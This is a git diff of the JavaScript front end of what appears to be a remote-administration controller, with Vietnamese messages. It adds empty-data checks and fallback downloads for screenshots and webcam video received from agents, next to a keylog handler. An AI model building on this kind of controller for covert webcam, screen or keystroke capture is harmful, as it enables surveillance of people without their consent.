@@ -104,6 +104,15 @@ const gateway = new Gateway({
                 }
             }, 1000);
         }
+        
+        // If on Proc_Menu page, trigger refreshProcessList after auth
+        if (window.location.pathname.includes('Proc_Menu')) {
+            setTimeout(() => {
+                if (window.refreshProcessList) {
+                    window.refreshProcessList();
+                }
+            }, 1000);
+        }
     },
     onAgentListUpdate: (agentList) => {
         ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
@@ -129,19 +138,25 @@ const gateway = new Gateway({
         
         // Check if we're on screen_webcam page and display preview
         if (window.displayImagePreview && window.location.pathname.includes('screen_webcam')) {
-            window.displayImagePreview(base64Data);
-        }
-        
-        // Also show in modal if available (for other pages)
-        const modal = document.getElementById('image-modal');
-        const img = document.getElementById('modal-img');
-        
-        if (img && modal) {
-            img.src = "data:image/jpeg;base64," + base64Data;
-            modal.classList.remove('hidden');
-            modal.style.display = 'block';
-        } else if (!window.displayImagePreview) {
-            console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
+            if (base64Data && base64Data.trim() !== '') {
+                window.displayImagePreview(base64Data);
+            } else {
+                if (window.handleCaptureError) {
+                    window.handleCaptureError('Không nhận được dữ liệu ảnh từ server');
+                }
+            }
+        } else {
+            // Also show in modal if available (for other pages)
+            const modal = document.getElementById('image-modal');
+            const img = document.getElementById('modal-img');
+            
+            if (img && modal) {
+                img.src = "data:image/jpeg;base64," + base64Data;
+                modal.classList.remove('hidden');
+                modal.style.display = 'block';
+            } else if (!window.displayImagePreview) {
+                console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
+            }
         }
     },
     onCamera: (videoData, agentId) => {
@@ -149,13 +164,21 @@ const gateway = new Gateway({
         
         // Check if we're on screen_webcam page and display preview
         if (window.displayVideoPreview && window.location.pathname.includes('screen_webcam')) {
-            window.displayVideoPreview(videoData);
+            if (videoData && videoData.trim() !== '') {
+                window.displayVideoPreview(videoData);
+            } else {
+                if (window.handleCaptureError) {
+                    window.handleCaptureError('Không nhận được dữ liệu video từ server');
+                }
+            }
         } else {
             // Fallback to download if not on preview page
-            const link = document.createElement('a');
-            link.href = "data:video/mp4;base64," + videoData;
-            link.download = `cam_${agentId}_${Date.now()}.mp4`;
-            link.click();
+            if (videoData && videoData.trim() !== '') {
+                const link = document.createElement('a');
+                link.href = "data:video/mp4;base64," + videoData;
+                link.download = `cam_${agentId}_${Date.now()}.mp4`;
+                link.click();
+            }
         }
     },
     onKeylog: (keyData, agentId) => {
@@ -176,7 +199,9 @@ const gateway = new Gateway({
 
 window.ui = ui;
 window.gateway = gateway;
-window.appState = appState; 
+window.CONFIG = CONFIG;
+window.appState = appState;
+window.CONFIG = CONFIG; 
 
 window.help = () => {
     console.clear();
